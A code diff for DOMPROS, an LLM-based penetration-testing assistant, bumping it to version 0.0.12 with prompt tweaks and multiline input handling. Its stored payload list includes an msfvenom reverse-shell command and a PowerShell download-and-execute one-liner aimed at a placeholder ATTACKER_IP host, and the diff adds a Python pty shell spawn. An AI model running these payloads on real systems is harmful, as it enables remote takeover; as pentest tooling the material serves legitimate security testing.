@@ -4,7 +4,7 @@
 # DOMPROS - AI-Powered Penetration Testing Assistant  #
 # by DeepSeek R1 & Samiux (MIT License)               #
 #                                                     #
-# Version 0.0.11 Dated Mar 04, 2025                   #
+# Version 0.0.12 Dated Mar 05, 2025                   #
 #                                                     #
 # Powered by DeepSeek R1 and Ollama                   #
 # Websites - https://samiux.github.io/dompros         #
@@ -53,11 +53,11 @@ SYSTEM_PROMPTS = {
     "search": (
         "You are an AI vulnerability research engine. For each query:\n"
         "1. Perform CVE/CWE analysis with CVSS 3.1 scoring breakdown\n"
-        "2. Generate exploit PoC template (Python/Rust) with modular design\n"
+        "2. Generate exploit PoC template (Python/Rust/C) with modular design\n"
         "3. Map to MITRE ATT&CK (TTPs) and CAPEC patterns\n"
         "4. Create comparative table of public exploits (GitHub/ExploitDB)\n"
         "5. Provide hardening checklist with Ansible/YAML snippets\n"
-        "6. Include detection rules (Sigma, YARA, Snort)\n"
+        "6. Include detection rules (Suricata, Sigma, YARA, Snort)\n"
         "7. Add patch analysis timeline and 0-day likelihood estimation\n"
         "8. Format with markdown headers, code folding, and exploit matrix"
     ),
@@ -131,7 +131,8 @@ SHELL_DB = {
     ],
     "payload_generators": [
         {"name": "MSFvenom Reverse Shell", "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf", "platform": "Metasploit", "description": "Generate Linux reverse shell payload"},
-        {"name": "PowerShell Base64", "command": "powershell -e $(echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/script.ps1\")' | base64)", "platform": "Windows", "description": "Base64 encoded PowerShell command"}
+        {"name": "PowerShell Base64", "command": "powershell -e $(echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/script.ps1\")' | base64)", "platform": "Windows", "description": "Base64 encoded PowerShell command"},
+        {"name": "Python bash Shell", "command": "python -c \'import pty;pty.spawn(\"bin/bash\")\'", "platform": "Linux", "description": "Python bash Shell one-liner command"}
     ]
 }
 
@@ -175,11 +176,11 @@ def show_help():
     print("  brainstorm        - Generate attack ideas")
     print("  tools <query>     - Tool recommendations")
     print("  shelldb [category]- Show stored commands/payloads")
-    
+
     print(Fore.YELLOW + "\nShell Database Categories" + Style.RESET_ALL)
     for category in SHELL_DB:
         print(f"  {category.ljust(18)}- {SHELL_DB[category][0]['description'].split('.')[0]} commands")
-    
+
     print(Fore.YELLOW + "\nUtility Commands" + Style.RESET_ALL)
     print("  help              - Show this help menu")
     print("  exit              - Exit the program")
@@ -218,9 +219,9 @@ def print_banner():
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
 {Style.RESET_ALL}
 {Fore.YELLOW}    DOMPROS - AI-Powered Penetration Testing Assistant
-{Fore.WHITE}    Version 0.0.11 | MIT License | Secure your systems!
+{Fore.WHITE}    Version 0.0.12 | MIT License | Secure your systems!
 {Fore.WHITE}    by DeepSeek R1 and Samiux
-{Fore.WHITE}    Dated Mar 04, 2025
+{Fore.WHITE}    Dated Mar 05, 2025
 """
     print(banner)
     logging.info("Application started with banner display")
@@ -298,39 +299,48 @@ def search_ddg(query):
         logging.error(f"DDG search failed: {str(e)}")
         return "Search error"
 
-def process_command(command, args, chat_history):
-    """Handle commands within chat context"""
+def get_multiline_input(prompt_message):
+    """Capture multi-line input from user (ESC+Enter to finish)"""
+    print(Fore.YELLOW + f"\n{prompt_message} (Press <ESC> + <Enter> to finish):" + Style.RESET_ALL)
     try:
-        logging.info(f"Processing command: {command} with args: {args[:50]}...")
+        # Single prompt call with multiline support
+        user_input = prompt(ANSI(Fore.CYAN + "> " + Style.RESET_ALL), multiline=True)
+        return user_input.strip() if user_input else None
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[!] Input canceled." + Style.RESET_ALL)
+        return None
 
+def process_command(command, args, chat_history):
+    """Handle commands with input validation"""
+    try:
+        # Handle multi-line input
         if command in ["analyze", "brainstorm"] and not args:
             args = get_multiline_input({
                 "analyze": "Paste security findings:",
                 "brainstorm": "Describe the problem:"
             }[command])
-            logging.debug("Received multiline input")
+            
+            if not args:
+                logging.info("Command canceled by user")
+                return  # Exit if input is empty/canceled
 
+        # Validate non-empty input
+        if not args.strip():
+            print(Fore.RED + "[!] Empty input. Command ignored." + Style.RESET_ALL)
+            return
+
+        # Rest of the processing logic...
         chat_history.append({"role": "user", "content": f"{command} {args}".strip()})
         log_chat_entry("User", f"{command} {args}".strip())
-
-        conversation = "\n".join(
-            f"{msg['role'].title()}: {msg['content']}"
-            for msg in chat_history
-        )
-
-        search_query = args if command == "search" else f"{command} {args}"
-        search_results = search_ddg(search_query)
-        full_prompt = f"{conversation}\nSearch Results:\n{search_results}\nAssistant: "
-
-        response = ollama_chat(SYSTEM_PROMPTS[command], full_prompt)
+        
+        # Generate response
+        response = ollama_chat(SYSTEM_PROMPTS[command], f"{command} {args}".strip())
         chat_history.append({"role": "assistant", "content": response})
         log_chat_entry("AI Assistant", response)
 
-        return response
     except Exception as e:
         logging.error(f"Command processing failed: {str(e)}")
-        return f"Error processing command: {str(e)}"
-
+        
 def main():
     """Main application loop"""
     if not check_ollama():
@@ -360,7 +370,7 @@ def main():
                 print(Fore.YELLOW + "\n[+] Exiting. Happy hacking!")
                 logging.info("User initiated exit")
                 break
-                
+
             if user_input.lower() == "help":
                 show_help()
                 continue
